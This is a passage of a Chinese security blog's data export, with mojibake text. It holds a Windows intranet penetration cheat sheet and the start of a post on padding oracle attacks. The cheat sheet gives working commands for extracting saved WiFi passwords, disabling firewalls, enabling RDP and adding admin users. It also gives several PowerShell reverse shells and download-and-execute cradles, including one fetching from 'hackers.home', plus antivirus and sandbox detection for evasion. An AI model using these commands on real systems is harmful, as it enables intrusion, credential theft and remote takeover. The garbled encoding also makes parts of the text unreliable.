&#125;","categories":[],"tags":[{"name":"ç³»ç»Ÿç›¸å…³ä¸å…æ€","slug":"ç³»ç»Ÿç›¸å…³ä¸å…æ€","permalink":"http://const27.com/tags/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E4%B8%8E%E5%85%8D%E6%9D%80/"}]},{"title":"Windowså†…ç½‘æ¸—é€å¸¸ç”¨å‘½ä»¤æ€»æ±‡","slug":"windowså†…ç½‘æ¸—é€å¸¸ç”¨å‘½ä»¤æ€»æ±‡","date":"2021-09-03T13:07:23.349Z","updated":"2021-09-03T13:18:16.804Z","comments":true,"path":"2021/09/03/windowså†…ç½‘æ¸—é€å¸¸ç”¨å‘½ä»¤æ€»æ±‡/","link":"","permalink":"http://const27.com/2021/09/03/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/","excerpt":"","text":"æ­£æ–‡å‰å‡ å¤©é¢è¯•çš„æ—¶å€™è¢«å¸ˆå‚…é—®åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œå½“æ—¶ä¸æ˜¯å¾ˆä¼šï¼Œç°åœ¨æ¥å­¦å­¦ æŸ¥è¯¢ç½‘ç»œé…ç½®ä¿¡æ¯ipconfig /all æŸ¥è¯¢æœ¬æœºçš„æœåŠ¡ä¿¡æ¯wmic service list brief æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯systeminfo è¿æ¥è¿‡çš„WIFIåŠå¯†ç  for /f â€œskip=9 tokens=1,2 delims=:â€ %i in (â€˜netsh wlan show profilesâ€™) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨tasklist / wmic process list brief æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡schtasks /query /fo LIST /v åˆ—å‡ºè®¡åˆ’ä»»åŠ¡è¯¦ç»†ä¿¡æ¯ æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´net statistics workstation ç”¨æˆ·ç›¸å…³net user æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·net localgroup administrators è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯ æŸ¥çœ‹ç«¯å£åˆ—è¡¨netstat -ano æŸ¥çœ‹å·²æ‰“è¡¥ä¸wmic qfe get Caption,Description,HotFixID,InstalledOn æŸ¥çœ‹å…±äº«åˆ—è¡¨net share æŸ¥çœ‹æœ¬æœºå…±äº«åˆ—è¡¨å’Œå¯è®¿é—®çš„åŸŸå…±äº«åˆ—è¡¨wmic share get name,path,status æŸ¥æ‰¾å…±äº«åˆ—è¡¨ è·¯ç”±è¡¨å’Œarpé«˜é€Ÿç¼“å­˜è¡¨route print è·¯ç”±è¡¨arp -a arpé«˜é€Ÿç¼“å­˜è¡¨ é˜²ç«å¢™netsh firewall set opmode disable å…³é—­é˜²ç«å¢™(Windows Server 2003 ä»¥å‰çš„ç‰ˆæœ¬) netsh advfirewall set allprofiles state off å…³é—­é˜²ç«å¢™(Windows Server 2003 ä»¥åçš„ç‰ˆæœ¬) netsh firewall show config æŸ¥çœ‹é˜²ç«å¢™é…ç½®å¦‚æœä¸Šé¢çš„å‘½ä»¤è¢«å¼ƒç”¨ï¼Œåˆ™ä½¿ç”¨netsh advfirewall firewall show rule name=all æ ¹æ®å‚è€ƒï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªwmicä¸€é”®è·å–æœ¬æœºä¿¡æ¯http://www.fuzzysecurity.com/scripts/files/wmic_info.rar æƒé™æŸ¥çœ‹whoami /all æŸ¥çœ‹è‡ªå·±çš„è¯¦ç»†æƒé™net user xxx /domain æŸ¥çœ‹åŸŸå†…æŒ‡å®šç”¨æˆ·çš„æƒé™ åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ.net time /domain è‹¥å‡ºç°ä»¥ä¸‹æƒ…å†µåˆ™ä¸å­˜åœ¨åŸŸ è‹¥æ˜¯æŠ¥é”™ï¼šå‘ç”Ÿç³»ç»Ÿé”™è¯¯5ï¼Œåˆ™å­˜åœ¨åŸŸï¼Œä½†è¯¥ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ· è‹¥æ˜¯ä»¥ä¸‹æƒ…å†µåˆ™è¯´æ˜å­˜åœ¨åŸŸä¸”å·²ç»åœ¨åŸŸä¸­ æŸ¥çœ‹åŸŸçš„åå­—net config workstation nslookup -type=srv _ldap._tcp è¿™ä¸ªå¾ˆçˆ½ï¼ŒåŸŸæ§ä¸»æœºåå’ŒIPä¸€å—å¼„å‡ºæ¥äº† æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº1.ä½¿ç”¨å·¥å…· nbtscan http://www.unixwiz.net/tools/nbtscan.html 2.æŸ¥çœ‹arpé«˜é€Ÿç¼“å­˜è¡¨ arp -a 3.ICMPåè®®æ¢æµ‹ï¼ˆé€ä¸ªpingï¼‰ è¿™ä¸ªè´¼æ…¢ï¼Œä½†æ˜¯ä¸ç”¨ä¸‹è½½å…¶ä»–åº”ç”¨ for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&quot; 4.nmapç›´æ¥å¼€æ‰« 5.meterpreterä¼šè¯ä¸­æ‰§è¡Œ run windows/gather/enum_ad_computers æ‰«æåŸŸå†…å¼€æ”¾ç«¯å£1.nmap nmap 192.168.1.0/24 2.å·¥å…· Sæ‰«æå™¨ 3.è‡ªå†™è„šæœ¬ #python3 æ…¢çš„ä¸€æ‰¹import socket def get_ip_status(ip,port): server &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: server.connect((ip,port)) print(&#39;&#123;0&#125; port &#123;1&#125; is open&#39;.format(ip, port)) except Exception as err: print(&#39;&#123;0&#125; port &#123;1&#125; is not open&#39;.format(ip,port)) finally: server.close() if __name__ &#x3D;&#x3D; &#39;__main__&#39;: host &#x3D; &#39;172.16.0.198&#39; for port in range(20,100): get_ip_status(host,port) åŸŸå†…åŸºæœ¬ä¿¡æ¯net group â€œdomain computersâ€ /domain æŸ¥è¯¢æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨net view /domain:HACHE æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ä¸»æœºnet accounts /domain è·å–åŸŸå¯†ç ä¿¡æ¯nltest /domain_trusts è·å–åŸŸä¿¡ä»»ä¿¡æ¯nltest /DCLIST:hacke æŸ¥çœ‹åŸŸæ§åˆ¶å™¨æœºå™¨åNslookup -type=SRV_ldap._tcp æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„ä¸»æœºå åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†net user /domain å‘åŸŸæ§åˆ¶å™¨æŸ¥è¯¢åŸŸå†…ç”¨æˆ·åˆ—è¡¨wmic useraccount get /all è·å–åŸŸå†…ç”¨æˆ·è¯¦ç»†ä¿¡æ¯net localgroup administrators æŸ¥è¯¢æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·net group â€œdomain adminsâ€ /domain æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·net group â€œEnterprise adminsâ€ /domain æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„ æœ¬æœºwmicæŸ¥æ€è½¯WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:Listor WMIC /namespace:\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe å¼€3389REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminalâ€ â€œServer /v fDenyTSConnections /t REG_DWORD /d 0 /f ç”¨æˆ·å¢åˆ æ”¹æŸ¥net user username password /add åŠ ç”¨æˆ· net localgroup administrators username /add æ·»åŠ XXåˆ°ç®¡ç†å‘˜è´¦æˆ· ä¸€äº›å–œæ¬¢ç”¨çš„Windows åå¼¹shell powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;); powercat -c 192.168.1.4 -p 9999 -e cmdpowershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666NISHANGé‡Œé¢æŠ çš„ï¼ˆä¹ä¸ç‰ˆï¼‰$sm&#x3D;(New-Object Net.Sockets.TCPClient(&quot;192.168.254.1&quot;,55555)).GetStream();[byte[]]$bt&#x3D;0..65535|%&#123;0&#125;;while(($i&#x3D;$sm.Read($bt,0,$bt.Length)) -ne 0)&#123;;$d&#x3D;(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st&#x3D;([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)&#125; ï¼ˆè±ªåç‰ˆï¼‰$client &#x3D; New-Object System.Net.Sockets.TCPClient(&quot;192.168.254.1&quot;,4444);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()(cmdä¸“ç‰ˆ)rundll32.exe javascript:&quot;&quot;\\..\\mshtml,RunHTMLApplication &quot;&quot;;document.write();r&#x3D;new%20ActiveXObject(&quot;&quot;WScript.Shell&quot;&quot;).run(&quot;&quot;powershell -w h -ep bypass &#96;$sm&#x3D;(New-Object Net.Sockets.TCPClient(&#39;$IPAddress&#39;,$Port)).GetStream();[byte[]]&#96;$bt&#x3D;0..65535|%&#123;0&#125;;while((&#96;$i&#x3D;&#96;$sm.Read(&#96;$bt, 0, &#96;$bt.Length)) -ne 0)&#123;;&#96;$d&#x3D;(New-Object Text.ASCIIEncoding).GetString(&#96;$bt,0, &#96;$i);&#96;$sb&#x3D;(iex &#96;$d 2&gt;&amp;1 | Out-String );&#96;$sb2&#x3D;&#96;$sb + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;&#96;$sb&#x3D;([text.encoding]::UTF8).GetBytes(&#96;$sb2);&#96;$sm.Write(&#96;$sb,0,&#96;$sb.Length);&#96;$sm.Flush()&#125;&quot;&quot;,0,true); wmic æŸ¥æ€è½¯ WMIC &#x2F;namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExeWMIC &#x2F;Node:localhost &#x2F;Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:List å¼€3389 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;fwmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1wmic &#x2F;namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName &#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 0 å¸¸è§æ€è½¯è¿›ç¨‹åhttps://blog.csdn.net/weixin_39997829/article/details/92666552 cmdä¸‹è½½ bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;www.xx.com&#x2F;code.jpg c:\\users\\sdyp\\desktop\\ff.jpgC:\\Temp&gt;certutil.exe -urlcache -split -f &quot;https:&#x2F;&#x2F;hackers.home&#x2F;badcontent.txt&quot; bad.txtC:\\Temp&gt;certutil.exe -decode bad.txt bad.exe è·å–ç›˜ç¬¦ wmic logicaldisk where drivetype&#x3D;3 get deviceid ps cs ä¸Šçº¿powershell.exe -c IEX((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;a.ps1&#39;))powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials&#x3D;[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http:&#x2F;&#x2F;webserver&#x2F;payload.ps1&#39;)|iex&quot;powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1 (smb) æŸ¥çœ‹å¼€æœºè‡ªå¯Reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run è·å–é¥æµ‹ä»»åŠ¡Reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\Appraiser åç—…æ¯’æ£€æµ‹Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct æ ¹æ®ç³»ç»Ÿçš„ä¸åŒï¼Œåç—…æ¯’è½¯ä»¶é€šå¸¸ä¼šWMIä¸­æ³¨å†Œä¸ºAntiVirusProductï¼Œä¿å­˜åœ¨root\\SecurityCenteræˆ–root\\SecurityCenter2å‘½åç©ºé—´ä¸­ã€‚ ç®€å•çš„æ²™ç›’&amp;è™šæ‹Ÿæœºæ£€æµ‹æ²™ç›’å¾€å¾€æ˜¯å•æ ¸ä¸”å†…å­˜å°äº2gï¼Œå¯ä»¥ä»¥æ­¤ä¸ºå‡­æ®æ£€æµ‹ Get-WmiObject -Class Win32_ComputerSystem NumberOfLogicalProcessors,TotalPhysicalMemory VMWAREè™šæ‹Ÿæœºå¦‚ä»Šç”¨çš„æ¯”è¾ƒå¤šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ£€æµ‹è¿›ç¨‹ä¸­æ˜¯å¦å­˜åœ¨vmtoolsdä»¥åŠBIOSå±æ€§é‡Œæ˜¯å¦æœ‰VMWAREå­—æ ·æ¥åˆ¤æ–­æ˜¯å¦æ˜¯VMWAREè™šæ‹Ÿæœº Get-WmiObject Win32_BIOS -Filter &#39;SerialNumber Like &quot;%VMware%&quot;&#39;Get-WmiObject Win32_NetworkAdapter -Filter &#39;Manufacturer LIKE &quot;%VMware%&quot; OR Name LIKE &quot;%VMware%&quot;&#39;","categories":[],"tags":[{"name":"å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ","slug":"å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ","permalink":"http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"WEBä¸­å¸¸è§çš„å‡ ç±»å¯†ç å­¦æ”»å‡»æ–¹å¼","slug":"WEBä¸­å¸¸è§çš„å‡ ç±»å¯†ç å­¦æ”»å‡»æ–¹å¼","date":"2021-06-28T13:52:26.915Z","updated":"2021-06-28T13:42:56.111Z","comments":true,"path":"2021/06/28/WEBä¸­å¸¸è§çš„å‡ ç±»å¯†ç å­¦æ”»å‡»æ–¹å¼/","link":"","permalink":"http://const27.com/2021/06/28/WEB%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%A0%E7%B1%BB%E5%AF%86%E7%A0%81%E5%AD%A6%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","excerpt":"","text":"å‚è€ƒ: https://www.freebuf.com/articles/database/151167.htmlhttps://www.jianshu.com/p/7f171477a603 å› ä¸ºæ˜¯æ¶‰åŠå¯†ç å­¦çš„ä¸œè¥¿ï¼Œæ‰€ä»¥çœ‹çš„æˆ‘å¤´å¤§ï¼Œè®°å½•ä¸€ä¸‹å§ã€‚ Padding oracle attack ä¸CBCç¿»è½¬å­—èŠ‚æ”»å‡»å¼‚æˆ–ï¼ˆXORï¼‰ä½•ä¸ºå¼‚æˆ–?å¼‚æˆ–æ˜¯ä¸€ç§è¿ç®—æ–¹æ³•ï¼Œç®€è¦æ¦‚æ‹¬å°±æ˜¯åŒå‡å¼‚çœŸ true xor true &#x3D; false; true xor false &#x3D; true;åœ¨äºŒè¿›åˆ¶ä¸­:011 xor 110 &#x3D; 101; äºŒè¿›åˆ¶æ•°æ¯ä½æ•°åˆ†åˆ«è¿›è¡Œxorè¿ç®—ä¸Šé¢ç®—å¼çš„è¿ç®—æ­¥éª¤æ˜¯è¿™æ ·çš„ 0 xor 1 &#x3D; 1;1 xor 1 &#x3D; 0;1 xor 0&#x3D;1ç„¶åæŠŠè¿ç®—ç»“æœå†™åœ¨ä¸€èµ·å°±æ˜¯101äº†åœ¨æ›´é«˜çš„è¿›åˆ¶ä¸­:ä»¥åè¿›åˆ¶ä¸ºä¾‹: 65 xor 42 &#x3D; 107; åŸç†å°±æ˜¯æŠŠåè¿›åˆ¶æ•°å­—å…ˆå˜ä¸ºäºŒè¿›åˆ¶æ•°è¿›è¡Œå¼‚æˆ–ï¼Œå†å°†å¼‚æˆ–å¾—åˆ°çš„äºŒè¿›åˆ¶æ•°ç»“æœå˜ä¸ºåè¿›åˆ¶æ•°åœ¨å­—ç¬¦ä¸­:å¯¹å­—ç¬¦è¿›è¡Œå¼‚æˆ–è¿ç®—å…¶å®å°±æ˜¯å¯¹å­—ç¬¦çš„asciiç è¿›è¡Œå¼‚æˆ–è®¡ç®—ï¼Œè®¡ç®—å¾—åˆ°çš„ç»“æœè§†ä½œæ–°çš„ä¸€ä¸ªasciiç å†å°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ã€‚ xorè¿˜æœ‰ä¸€ä¸ªæ€§è´¨ï¼Œå°±æ˜¯å·²çŸ¥ a xor b = c é‚£ä¹ˆb xor c =a; a xor c = b.å³æ»¡è¶³å¼‚æˆ–è¿ç®—é‡Œåªéœ€çŸ¥é“ä»»æ„ä¸¤ä¸ªæ•°å°±èƒ½å¾—åˆ°å¦ä¸€ä¸ªæ•°ã€‚ CBCæ¨¡å¼CBCæ˜¯ä¸€ç§åŠ å¯†æ¨¡å‹ï¼Œé‡‡ç”¨çš„æ˜¯åˆ†ç»„é“¾æ¥æ¨¡å¼ã€‚æŠŠæ˜æ–‡åˆ†ä¸ºä¸€ç»„ä¸€ç»„è¿›è¡ŒåŠ å¯† ä¸Šå›¾æ˜¯CBCåŠ å¯†æµç¨‹ã€‚æœ€å¼€å§‹ä¸€ä¸ªç‰¹åˆ«åˆ†ç»„IVå»å’Œç¬¬ä¸€æ®µå¯†æ–‡XORï¼Œå¾—åˆ°çš„ç»“æœè¢«å¯†é’¥åŠ å¯†ï¼ŒåŠ å¯†å¾—åˆ°è¯¥ç»„çš„å¯†æ–‡ï¼ŒåŒæ—¶è¿™ä¸ªå¯†æ–‡ä¼šå……å½“æœ€å¼€å§‹çš„ç‰¹åˆ«åˆ†ç»„IVçš„ä½œç”¨å»å‚ä¸ä¸‹ä¸€ç»„çš„åŠ å¯†ï¼Œä»¥æ­¤ç±»æ¨ã€‚ CBCçš„æ¯ä¸€ä¸ªåˆ†ç»„çš„åŠ å¯†ç»“æœéƒ½å¯ä»¥å½±å“åˆ°ä¸‹ä¸€ä¸ªåˆ†ç»„çš„åŠ å¯†ç»“æœï¼Œ ä½¿åŸæœ¬ç‹¬ç«‹çš„åˆ†ç»„å¯†ç åŠ å¯†è¿‡ç¨‹å½¢æˆè¿­ä»£ ï¼Œ è¿™å¯ä»¥å¼ºåŒ–åŠ å¯†ç®—æ³•çš„â€æ•æ„Ÿæ€§â€ï¼Œå³å®ç°æ‰€è°“çš„â€é›ªå´©æ•ˆåº”â€ï¼Œåœ¨é¦™æµ“ç†è®ºä¸­è¿™å°±æ˜¯â€æ‰°ä¹±åŸåˆ™â€ ã€‚ CBCåªæ˜¯ä¸€ç§æ¨¡å¼ï¼Œå®ƒç»å¸¸æŠŠaesæˆ–desä½œä¸ºåŠ å¯†ä½¿ç”¨çš„ç®—æ³•ã€‚ DESåˆ†ç»„é•¿åº¦æ˜¯å…«å­—èŠ‚è€ŒAESåˆ†ç»„é•¿åº¦æ˜¯åå…­å­—èŠ‚ ã€‚ æ¥ä¸‹æ¥æ˜¯CBCè§£å¯† é¡ºåºä¾æ—§æ˜¯ä»å·¦åˆ°å³ï¼Œç¬¬ä¸€ç»„å¯†æ–‡è¢«KEYè§£å¯†åä¸IV xorå¾—åˆ°ç¬¬ä¸€ç»„æ˜æ–‡ï¼ŒåŒæ—¶ç¬¬ä¸€ç»„å¯†æ–‡å‚ä¸ä¸‹ä¸€ç»„çš„è§£å¯†å……å½“IVä½œç”¨ã€‚ PKCS #5ç«Ÿç„¶CBCæ¨¡å¼æ¶‰åŠåˆ°åˆ†ç»„ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°æœ€åä¸€ç»„å­—èŠ‚æ²¡æœ‰è¢«å æ»¡çš„æƒ…å†µã€‚æ¯”å¦‚åŸæœ¬ä¸€ä¸ªåˆ†ç»„æ˜¯8å­—èŠ‚ï¼Œæˆ‘ä»¬æœ‰15ä¸ªå­—èŠ‚çš„æ˜æ–‡éœ€è¦è¢«åŠ å¯†ï¼Œæ­¤æ—¶æœ€åä¸€ä¸ªåˆ†ç»„å°±ä¸ä¼šè¢«å æ»¡ï¼ˆè¿˜å·®ä¸€ä¸ªå­—èŠ‚å æ»¡ï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™è¦æ€ä¹ˆåŠå‘¢ï¼Ÿ è¿™æ—¶å€™å°±éœ€è¦å¯¹æœ€åä¸€ä¸ªåˆ†ç»„è¿›è¡Œå¡«å……ï¼Œå°†å…¶å¡«å……æ»¡ã€‚å¯¹äºé‡‡ç”¨desç®—æ³•åŠ å¯†çš„å†…å®¹ï¼Œå¡«å……è§„åˆ™æ˜¯PKC #5,è€ŒAESæ˜¯ PKC #7.è¿™ä¸¤è€…å”¯ä¸€åŒºåˆ«æ˜¯ PKCS #5å¡«å……æ˜¯å…«å­—èŠ‚åˆ†ç»„è€ŒPKCS #7æ˜¯åå…­å­—èŠ‚ ï¼Œè¿˜è®°å¾—ä¸Šé¢æˆ‘ä»¬è¯´è¿‡çš„ DESåˆ†ç»„é•¿åº¦æ˜¯å…«å­—èŠ‚è€ŒAESåˆ†ç»„é•¿åº¦æ˜¯åå…­å­—èŠ‚ å—ï¼Ÿå°±æ˜¯è¿™ä¸ªåˆ†ç»„å­—èŠ‚æ•°å½±å“äº†å¡«å……æ–¹å¼ã€‚ é‚£ä¹ˆå…·ä½“æ˜¯æ€ä¹ˆå¡«å……çš„å‘¢ï¼Œæˆ‘ä»¬ä»¥PKC #5ä¸ºä¾‹ å½“æœ€åä¸€ç»„è¿˜å‰©nä¸ªå­—èŠ‚æœªè¢«å¡«å……æ—¶ï¼Œå°±ä¼šå¡«å……nä¸ª 0xnå­—ç¬¦ä¸Šå».ä¸Šå›¾æ˜¯PKCS #5,å…¶å®PKCS #7å’ŒPKCS #5åŸç†æ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡æ˜¯åˆ†ç»„å­—èŠ‚æ•°å¤§äº†ç‚¹ç½¢äº†ï¼ˆ0~16ï¼‰ Padding oracle attackä¸Šé¢åªæ˜¯é“ºå«ï¼Œå»ºè®®å­¦æ‡‚äº†å†æ¥çœ‹è¿™ä¸ªæ”»å‡»æ–¹å¼ã€‚ä¸ç„¶ä¼šéå¸¸å¤´å¤§ã€‚ Padding oracle attack æ”»å‡»åœºæ™¯ä¸¾ä¾‹é¦–å…ˆæˆ‘ä»¬å‡è®¾ä¸€ä¸ªåœºæ™¯ï¼Œä»è€Œå¼•å‡ºè¿™ä¸ªæ”»å‡»ã€‚ å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶åŒ…å«åœºæ™¯ url?file&#x3D;&#x2F;etc&#x2F;passwd é»‘å®¢ä»¬çœ‹è§äº†å°±ä¼šå¾ˆè½»è€Œæ˜“ä¸¾çš„å»åŒ…å«æƒ³è¦çš„æ–‡ä»¶ã€‚ç®¡ç†è€…å‘ç°äº†è¿™ä¸ªé—®é¢˜ï¼Œå¯¹fileå‚æ•°é‡‡ç”¨äº†CBCåŠ å¯†ï¼Œå³å½“æäº¤è¯·æ±‚æ—¶ï¼Œfileå‚æ•°çš„å€¼æ˜¯è¢«åŠ å¯†çš„ï¼Œç„¶åæœåŠ¡å™¨ç”¨ç®—æ³•è§£å¯†å¾—åˆ°å…¶æƒ³åŒ…å«çš„æ–‡ä»¶ï¼Œç„¶åè¿”å›ç»™å®¢æˆ·ç«¯ã€‚ url?file&#x3D;e28b2e3c972edab8 å…¶ä¸­å‰8ä½æ•°æ˜¯IVï¼Œåå…«ä½æ•°æ˜¯å¯†æ–‡ã€‚ï¼ˆè¿™é‡Œæ˜¯æˆ‘çå†™çš„å¯†æ–‡&#x3D; &#x3D;ï¼Œä½ åªéœ€è¦ç†è§£åˆ°è¿™é‡Œæ˜¯ä¸€ä¸ªCBCåŠ å¯†åçš„å¯†æ–‡å°±è¡Œäº†ï¼‰ é‚£ä¹ˆå¦‚ä½•å»å®ç°æˆ‘ä»¬çš„ä»»æ„æ–‡ä»¶åŒ…å«å‘¢? padding oracle attack å‡ºç°äº†ã€‚ æ”»å‡»åŸç†å‡è®¾æˆ‘ä»¬å‘åˆšåˆšé‚£ä¸ªä»»æ„æ–‡ä»¶åŒ…å«çš„æäº¤äº†ä¸€æ®µå¯†æ–‡ã€‚æœåŠ¡å™¨å°±ä¼šå°è¯•è§£å¯†ï¼Œå°±ä¼šå‡ºç°ä¸‰ç§ç»“æœã€‚ 1.å¯†æ–‡ä¸èƒ½æ­£å¸¸è§£å¯†ï¼Œè¿™ç§åŸå› æ˜¯åœ¨äºæœ€åä¸€ç»„çš„å¡«å……å­—èŠ‚å‡ºç°äº†é”™è¯¯2.å¯†æ–‡èƒ½æ­£å¸¸è§£å¯†ä½†è§£å¯†å‡ºæ¥çš„æ–‡ä»¶è·¯å¾„ä¸å­˜åœ¨3.å¯†æ–‡èƒ½æ­£å¸¸è§£å¯†ä¸”èƒ½æˆåŠŸåŒ…å« å…¶ä¸­ç¬¬1ç§æƒ…å†µå’Œ2.3ç§æƒ…å†µç½‘é¡µè¿”å›çš„å†…å®¹è‚¯å®šæ˜¯ä¸åŒçš„ã€‚æ¯”å¦‚è¯´ç¬¬ä¸€ç§æƒ…å†µå¯èƒ½å°±ç›´æ¥è¿”å›500äº†ï¼Œ2.3å¯èƒ½å°±æ˜¯302è·³è½¬å•¥å•¥çš„ï¼Œé€šè¿‡è¿™ä¸ªç½‘é¡µè¿”å›çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±æœ‰äº†å¯ä¹˜ä¹‹æœºã€‚ æˆ‘ä»¬å…ˆé€šè¿‡ä¸€ä¸ªå›¾æ„Ÿå—ä¸€ä¸‹ç¬¬ä¸€ç»„çš„è§£å¯†æµç¨‹ å¥½çš„å¥½çš„ï¼Œæ„Ÿå—äº†è¿™ä¸ªè§£å¯†æµç¨‹åï¼Œæˆ‘ä»¬æ¥è¯´è¯´æ”»å‡»çš„äº‹ã€‚å¦‚æœæˆ‘ä»¬å¾—åˆ°äº† Intermediary Value(ä¸­é—´å€¼)ï¼Œå¹¶ä¸”å¯ä»¥æ‰‹åŠ¨ä¿®æ”¹IVï¼Œé‚£ä¹ˆæˆ‘ä»¬å²‚ä¸æ˜¯å¯ä»¥æ„é€ ä»»æ„Decrypted Valueï¼ˆæ˜æ–‡ï¼‰äº†ï¼Ÿæ‰€ä»¥padding oracle attack çš„æ ¸å¿ƒå°±æ˜¯å»è·å¾—ä¸­é—´å€¼ã€‚é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆå»è·å–å‘¢ï¼Ÿ è¿˜è®°å¾—åˆšåˆšæåˆ°çš„3ç§æƒ…å†µå—ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹IVï¼Œé€šè¿‡åˆ¤æ–­ç½‘é¡µè¿”å›å†…å®¹æ¥åˆ¤æ–­ä¸­é—´å€¼ï¼Œå…·ä½“åšæ³•å¦‚ä¸‹: æˆ‘ä»¬å…ˆæŠŠIVå…¨éƒ¨è®¾ç½®ä¸º0x00ï¼Œç„¶åä¿®æ”¹IVçš„æœ€åä¸€ä¸ªæ•°ï¼Œå½“å…¶ä¸ä¸­é—´å€¼XORåçš„å€¼ä¸º0x01åˆ™æ­¤æ—¶è§£å¯†å°±ä¼šæˆåŠŸï¼Œè‹¥ä¸æ˜¯0x01è§£å¯†å°±ä¼šå¤±è´¥ï¼Œç½‘é¡µä¼šè¿”å›ä¸åŒçš„å†…å®¹ï¼Œä»¥æ­¤æ¥åˆ¤æ–­ä½•æ—¶è§£å¯†æˆåŠŸã€‚ç„¶åæŠŠè§£å¯†æˆåŠŸæ—¶çš„IVçš„æœ€åä¸€ä½æ•°ä¸0x01è¿›è¡Œå¼‚æˆ–è®¡ç®—ï¼Œå³å¯å¾—åˆ°ä¸­é—´å€¼çš„æœ€åä¸€ä½ 